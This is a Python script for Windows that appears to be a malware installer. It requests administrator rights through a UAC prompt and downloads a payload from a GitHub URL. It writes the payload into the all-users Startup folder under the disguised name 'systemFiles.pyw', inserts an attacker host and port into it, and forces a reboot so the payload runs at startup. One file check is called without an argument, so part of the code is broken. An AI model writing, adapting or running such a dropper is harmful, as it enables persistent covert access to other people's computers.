host = 'FILL_HERE'
port = 4000

import sys
import os
import ctypes
try:
    import requests

except ImportError:
    os.system('pip3 install requests')

# get admin priv
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    pass

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# check if file there
if os.path.isfile() == False:
    sys.exit()
# download file to startup
getFile = requests.get('https://raw.githubusercontent.com/remfinita017/miniS.py/master/blankFiles/blankPayload.py')
filePayload = open('C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/systemFiles.pyw', 'w+')
filePayload.write(getFile.text)
with open('C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/systemFiles.pyw', 'r') as file:
    fileData = file.readlines()

    fileData[0] = 'host = \'' + host + '\'\n'
    fileData[1] = 'port = ' + str(port) + '\n'

with open('C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/systemFiles.pyw', 'w') as file:
    file.writelines(fileData)
    
# restart computer
os.system("shutdown /r /t 1")